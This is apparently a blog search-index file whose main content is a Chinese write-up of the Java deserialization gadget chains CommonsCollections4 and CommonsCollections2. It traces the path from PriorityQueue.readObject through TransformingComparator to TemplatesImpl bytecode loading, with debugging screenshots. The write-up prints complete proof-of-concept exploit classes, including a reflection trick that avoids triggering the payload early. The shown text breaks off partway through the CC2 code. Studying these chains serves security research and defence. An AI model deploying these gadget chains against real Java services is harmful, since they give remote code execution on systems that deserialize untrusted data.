@@ -4098,4 +4098,345 @@
         <tag>java</tag>
       </tags>
   </entry>
+  <entry>
+    <title>CC4+CC2利用链分析</title>
+    <url>/2023/09/08/CC4-CC2%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>CommonCollections4与CommonCollections利用链分析</title>
+    <url>/2023/09/08/cc4%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>CC4这条利用链与前面不同的是用到了新的Commons-Collections4依赖库，我们在前面分析的CC1,3.6用的都是Commons-Collections库3.2.1的版本</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>CC4这条利用链最后和我们前面分析的利用链是一样的，使用Transform类对象的tranform方法直接执行代码，或者像CC3里面一样利用TemplatesImpl类去实现类加载执行任意代码。</p>
+<h2 id="二、利用链分析"><a href="#二、利用链分析" class="headerlink" title="二、利用链分析"></a>二、利用链分析</h2><p>无论我们利用链的后面是使用tranform直接执行代码，还是利用TemplatesImpl类去实现类加载执行任意代码，都是要向上找哪里调用了transfom方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230905084904958.png"
+                      alt="image-20230905084904958"
+                ></p>
+<p>可以看到又很多类方法调用了transform方法</p>
+<p>CC4这里用的是TransformingComparator类的<code>compare()</code>方法：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">public int compare(final I obj1, final I obj2) &#123;</span><br><span class="line">    final O value1 = this.transformer.transform(obj1);</span><br><span class="line">    final O value2 = this.transformer.transform(obj2);</span><br><span class="line">    return this.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里的compare调用了tranform方法，那我们接下来就要继续找对compare的调用,最好是直接重写了readObject方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230905085727058.png"
+                      alt="image-20230905085727058"
+                ></p>
+<p>可以看到这里面有很多，所有我们想要直接找到调用compare方法，并且可以直接readobject的很难，需要很强的java代码功底</p>
+<p>我们这里是为了分析利用链，所有就不一个个类的找了</p>
+<p>在CC4中利用的是java.util.PriorityQueue 优先队列这个类。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907184933597.png"
+                      alt="image-20230907184933597"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void siftDownUsingComparator(int k, E x) &#123;</span><br><span class="line">    int half = size &gt;&gt;&gt; 1;</span><br><span class="line">    while (k &lt; half) &#123;</span><br><span class="line">        int child = (k &lt;&lt; 1) + 1;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        int right = child + 1;</span><br><span class="line">        if (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; 0)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        if (comparator.compare(x, (E) c) &lt;= 0)</span><br><span class="line">            break;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>在PriorityQueue类的siftDownUsingComparator中调用了compare方法</p>
+<p>到这里我们可以看到是通过comparator调用了compare方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907185119139.png"
+                      alt="image-20230907185119139"
+                ></p>
+<p>而且我们可以看到comparator是初始化的时候传进去的，所以是可控的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907185224377.png"
+                      alt="image-20230907185224377"
+                ></p>
+<p>而且TransformingComparator类恰恰是实现了Comparator和Serializable接口</p>
+<p>而在前面分析CC3并没有用到这里是因为旧的Commons-Collections包中TransformingComparator类没有实现Serializable接口，导致无法使用这条链。</p>
+<p>那我们最好的就是能够通过PriorityQueue类的readObject方法直接调用到siftDownUsingComparator方法</p>
+<p>那就向上找siftUpUsingComparator的调用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void siftDown(int k, E x) &#123;</span><br><span class="line">    if (comparator != null)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    else</span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>在siftDown里面调用了siftUpUsingComparator方法</p>
+<p>继续向上找调用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>那我们这里就是继续找heapify方法的调用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230905090932057.png"
+                      alt="image-20230905090932057"
+                ></p>
+<p>可以看到有两处调用了heapify方法</p>
+<p>然后readObject方法中也调用了这个方法</p>
+<p>那我们的利用链就可以构造为：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject() --&gt; PriorityQueue.heapify() --&gt; PriorityQueue.siftDown() --&gt; PriorityQueue.siftDownUsingComparator() --&gt; TransformingComparator.compare() --&gt; Transformer.transform()</span><br></pre></td></tr></table></figure></div>
+
+<p>这是CC4的前半部分的利用链，后半部分就是CC3的写法了动态加载字节码或者transform直接进行命令执行</p>
+<p>这里就以动态加载字节码进行命令执行</p>
+<p>我们这里先构造利用TemplatesImpl加载字节码</p>
+<p>这里我们直接把CC3中的拿过了用就行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Templates templates = new TemplatesImpl();</span><br><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;字节码文件&quot;));</span><br><span class="line">byte[][] codes = &#123;code&#125;;</span><br><span class="line">setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure></div>
+
+<p>以及用 <code>InstantiateTransformer</code>类将TrAXFilter初始化，实现调用<code>TemplatesImpl.newTransformer()</code>方法，触发后续的调用：</p>
+<p>这里其实和CC3都是一样的</p>
+<p>那么我们后续的利用链代码就是：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Templates templates = new TemplatesImpl();</span><br><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">byte[][] codes = &#123;code&#125;;</span><br><span class="line">setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">//  templates.newTransformer();</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.InstantiateTransformer instantiateTransformer=new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125; );</span><br><span class="line">//instantiateTransformer.transform( TrAXFilter.class);</span><br><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">        new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">        instantiateTransformer</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure></div>
+
+<p>那么后面我们要做的就行通过TransformingComparator类的compare方法调用transform方法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public int compare(final I obj1, final I obj2) &#123;</span><br><span class="line">    final O value1 = this.transformer.transform(obj1);</span><br><span class="line">    final O value2 = this.transformer.transform(obj2);</span><br><span class="line">    return this.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907193505710.png"
+                      alt="image-20230907193505710"
+                ></p>
+<p>decorated可空是在TransformingComparator类初始化时传入的</p>
+<p>那我们这里直接可以把我们前面的chainTransformer作为参数传入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformingComparator transformingComparator =new TransformingComparator(chainedTransformer);</span><br></pre></td></tr></table></figure></div>
+
+<p>那么后面就是对compare的调用了</p>
+<p>前面我们分析对于compare的调用是在PriorityQueue类中实现的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907193751197.png"
+                      alt="image-20230907193751197"
+                ></p>
+<p>我们前面分析这个comparator也是可控的，所以我们可以直接在初始化类PriorityQueue将transformingComparator传入进去</p>
+<p>进而触发compare，触发后续利用链</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue priorityQueue =new PriorityQueue(transformingComparator);</span><br></pre></td></tr></table></figure></div>
+
+<p>其实到这里我们已经来到了readObject的类，后面就是反序列化触发到siftDownUsingComparator()方法</p>
+<p>那我们这里直接开始从readObject在分析一遍</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907194311361.png"
+                      alt="image-20230907194311361"
+                ></p>
+<p>readObject后就会触发到heapify</p>
+<p>跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907194337573.png"
+                      alt="image-20230907194337573"
+                ></p>
+<p>在heapify进行for循环就会调用sitfDown</p>
+<p>继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907194440954.png"
+                      alt="image-20230907194440954"
+                ></p>
+<p>到siftdown，这里会进行一个if判断，如果comparator不为空就会调用siftDownUsingComparator()</p>
+<p>我们前面在初始化PriorityQueue类时，将 transformingComparator作为参数赋值给了comparator用于触发后续利用链</p>
+<p>所以这里的if判断是肯定成立的</p>
+<p>进而触发了siftDownUsingComparator(k, x);</p>
+<p>跟进：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907194844692.png"
+                      alt="image-20230907194844692"
+                ></p>
+<p>在if判断中存在对compare的调用</p>
+<p>但是这里我们分析可以得知，在while循环中必然会触发if判读进而触发compare，触发后续利用链。</p>
+<p>所以理论上我们现在只需要进行序列化和反序列化就能够触发后续利用链。</p>
+<p>那么到这里我们的exp为</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fileNmae, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fileNmae);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, codes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer=<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125; );</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializable</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserializable</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>但是我们这里进行序列化和反序列化操作后并没有什么弹出计算器，也没有报错。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907200432678.png"
+                      alt="image-20230907200432678"
+                ></p>
+<p>打断点跟进调试</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907200509703.png"
+                      alt="image-20230907200509703"
+                ></p>
+<p>进行调试</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907201714594.png"
+                      alt="image-20230907201714594"
+                ></p>
+<p>这里大概就是将队列中的数据一个个反序列化，然后存储到定义的queue数组中</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907201843047.png"
+                      alt="image-20230907201843047"
+                ></p>
+<p>我们也可以看到在序列化的时候就是通过循环一个个的序列化</p>
+<p>跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907201949994.png"
+                      alt="image-20230907201949994"
+                ></p>
+<p>我们到这一步就没有进入到for循环中</p>
+<p>这也可能是我们代码没有正常弹出计算器的原因</p>
+<p>进入for循环的条件是i&gt;&#x3D;0</p>
+<p>而i的值是等于（size&gt;&gt;&gt;1）</p>
+<p><code>size &gt;&gt;&gt; 1</code> 是一个位操作，表示将 <code>size</code> 的二进制表示向右移动一位（相当于将 <code>size</code> 除以 2 并向下取整）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907202155487.png"
+                      alt="image-20230907202155487"
+                ></p>
+<p>而根据调试信息size的值为0，因为我们并没有向队列中传入数据</p>
+<p>队列中的元素个数为0，所以导致size的值为0</p>
+<p>size为0，那么右移三位还是0，然后减一，使i的值为-1，导致不满足循环的条件，无法进入循环</p>
+<p>那么我们想要进入循环就要使size&gt;&gt;&gt;1&#x3D;1</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907202643216.png"
+                      alt="image-20230907202643216"
+                ></p>
+<p>然后当size等于2的时候右移三位值为1</p>
+<p>所以我们至少向队列中传入两个数据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(1);</span><br><span class="line">priorityQueue.add(2);</span><br></pre></td></tr></table></figure></div>
+
+<p>但是添加后，即使我们不进行反序列化也会弹出计算器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907203047503.png"
+                      alt="image-20230907203047503"
+                ></p>
+<p>我们这里跟进到add分析一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907203138701.png"
+                      alt="image-20230907203138701"
+                ></p>
+<p>继续跟进</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public boolean offer(E e) &#123;</span><br><span class="line">    if (e == null)</span><br><span class="line">        throw new NullPointerException();</span><br><span class="line">    modCount++;</span><br><span class="line">    int i = size;</span><br><span class="line">    if (i &gt;= queue.length)</span><br><span class="line">        grow(i + 1);</span><br><span class="line">    size = i + 1;</span><br><span class="line">    if (i == 0)</span><br><span class="line">        queue[0] = e;</span><br><span class="line">    else</span><br><span class="line">        siftUp(i, e);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>我们添加了两个元素，所以size&#x3D;2</p>
+<p>最终会调用到siftip，继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907203824052.png"
+                      alt="image-20230907203824052"
+                ></p>
+<p>同样的comparator不为空，这里会调用siftupUsingComparator()方法</p>
+<p>继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907203940479.png"
+                      alt="image-20230907203940479"
+                ></p>
+<p>在这里也会调用到compare方法进而触发了后续的利用链，造成了命令执行</p>
+<p>其实这里和我们前面代码本地执行的解决方法一样</p>
+<p>在add前传递一个假的chaintransform，在add后再将真的chaintransform传进去</p>
+<p>那我们这里还可以用ConstantTransformer来实现</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformingComparator transformingComparator =new TransformingComparator(new ConstantTransformer(1));</span><br></pre></td></tr></table></figure></div>
+
+<p>然后再添加完，再通过反射修改为chaintransformer</p>
+<p>反射修改</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class c= transformingComparator.getClass();</span><br><span class="line"> Field transformField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line"> transformField.setAccessible(true);</span><br><span class="line"> transformField.set(transformingComparator,chainedTransformer);</span><br></pre></td></tr></table></figure></div>
+
+<p>POC：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class CC4  &#123;</span><br><span class="line">    public static void setFieldValue(Object obj, String fileNmae, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fileNmae);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line"></span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer=new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125; );</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator transformingComparator =new TransformingComparator(new ConstantTransformer(1));</span><br><span class="line">        PriorityQueue priorityQueue =new PriorityQueue(transformingComparator);</span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line">        Class c= transformingComparator.getClass();</span><br><span class="line">        Field transformField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line">        transformField.setAccessible(true);</span><br><span class="line">        transformField.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907205025239.png"
+                      alt="image-20230907205025239"
+                ></p>
+<p>然后进行反序列化</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907205044593.png"
+                      alt="image-20230907205044593"
+                ></p>
+<p>成功弹出了计算器。</p>
+<h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907210104034.png"
+                      alt="image-20230907210104034"
+                ></p>
+<h1 id="CommonsCollections2利用链分析"><a href="#CommonsCollections2利用链分析" class="headerlink" title="CommonsCollections2利用链分析"></a>CommonsCollections2利用链分析</h1><p>在上面CC4中我们是通过tranformeringComparator的cpmpare方法调用TiAXFilter类去调用后续的通过利用TemplatesImpl加载字节码进行命令执行</p>
+<p>但是我们在CC3中除了利用TiAXFilter类去调用后续的TemplatesImpl加载字节码还有一种方法是通过invokerTransformer去调用TemplatesImpl的newTransformer方法</p>
+<p>进行调用后续的加载字节码进行命令执行</p>
+<p>而CC2就是用这种方法去调用后续利用链</p>
+<p>所以说CC2就是CC4的前半部分利用链和CC3通过Invokertransform调用TemplatesImpl去动态加载字节码的结合</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908105610221.png"
+                      alt="image-20230908105610221"
+                ></p>
+<p>那这里直接把前面的代码结合一下就行了</p>
+<h2 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package leijiazai;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CC2 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;, null, null)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator transformingComparator =new TransformingComparator( new ConstantTransformer(1));</span><br><span class="line">        PriorityQueue priorityQueue =new PriorityQueue(transformingComparator);</span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span 